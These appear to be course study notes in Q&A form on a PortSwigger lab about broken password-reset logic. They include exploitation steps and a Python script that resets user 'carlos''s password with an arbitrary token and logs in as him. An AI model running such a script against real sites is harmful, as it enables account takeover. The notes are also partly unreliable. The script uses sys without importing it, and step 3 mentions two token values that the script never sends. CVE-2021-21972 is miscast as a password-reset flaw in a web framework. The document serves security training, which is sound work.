---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the vulnerability present in the password reset functionality of the lab.**

The vulnerability in the password reset functionality lies in its implementation. Specifically, the application does not validate whether the temporary forgot password token is associated with the user attempting to reset the password. Instead, it merely checks if the two provided tokens match. This means an attacker can supply any arbitrary token and reset the password for any user, including Carlos.

**Q2. How would you exploit the broken logic in the password reset functionality?**

To exploit the broken logic, follow these steps:

1. Identify the URL and parameters used in the password reset process.
2. Craft a POST request to the password reset endpoint with the following parameters:
   - `temporary_forgot_password_token`: Any arbitrary value.
   - `username`: The target user’s username (e.g., `carlos`).
   - `new_password`: The new password you wish to set.
   - `confirm_new_password`: The same new password for confirmation.
3. Ensure the `temporary_forgot_password_token` values match in both places.
4. Send the crafted request to the server.
5. Log in using the new password to gain access to the target user’s account.

**Q3. Write a Python script to automate the exploitation of the broken password reset functionality.**

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def access_carlos_account(session, url):
    # Define the URL for the password reset functionality
    password_reset_url = f"{url}/forgot-password"
    
    # Define the data for the password reset request
    password_reset_data = {
        'temporary_forgot_password_token': 'arbitrary_value',
        'username': 'carlos',
        'new_password': 'password',
        'confirm_new_password': 'password'
    }
    
    # Perform the password reset request
    r = session.post(password_reset_url, data=password_reset_data, verify=False)
    
    # Define the URL for the login functionality
    login_url = f"{url}/login"
    
    # Define the data for the login request
    login_data = {
        'username': 'carlos',
        'password': 'password'
    }
    
    # Perform the login request
    r = session.post(login_url, data=login_data, verify=False)
    
    # Check if the exploit worked by looking for the "log out" string in the response
    if 'log out' in r.text.lower():
        print("Successfully logged into Carlos' account.")
    else:
        print("Exploit failed.")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    session = requests.Session()
    
    access_carlos_account(session, url)

if __name__ == "__main__":
    main()
```

**Q4. Why is this type of vulnerability dangerous, and what are some real-world implications?**

This type of vulnerability is dangerous because it allows attackers to reset the passwords of any user within the application. This can lead to unauthorized access to sensitive information or accounts. Real-world implications include:

- **Data breaches**: Attackers can gain access to confidential data stored in user accounts.
- **Account takeover**: Users may lose control of their accounts, leading to financial losses or identity theft.
- **Reputation damage**: Organizations may suffer reputational damage due to security incidents.

A recent real-world example is the **CVE-2021-21972**, which affected a popular web application framework. The vulnerability allowed attackers to reset passwords without proper validation, leading to potential unauthorized access. This highlights the importance of robust validation mechanisms in password reset functionalities.

**Q5. How can organizations prevent such vulnerabilities in their applications?**

Organizations can prevent such vulnerabilities by implementing the following best practices:

1. **Validate Tokens**: Ensure that the temporary password reset tokens are properly validated against the user’s account.
2. **Use Secure Tokens**: Generate strong, unique tokens that are difficult to guess or predict.
3. **Limit Token Validity**: Set a short expiration time for the tokens to minimize the window of opportunity for attackers.
4. **Monitor and Alert**: Implement monitoring and alerting mechanisms to detect and respond to suspicious activities related to password resets.
5. **Regular Audits**: Conduct regular security audits and penetration testing to identify and fix vulnerabilities.

By adhering to these practices, organizations can significantly reduce the risk of such vulnerabilities and protect their users’ accounts.

---
<!-- nav -->
[[03-Authentication Vulnerabilities Password Reset Broken Logic|Authentication Vulnerabilities Password Reset Broken Logic]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/04-Lab 3 Password reset broken logic/00-Overview|Overview]]
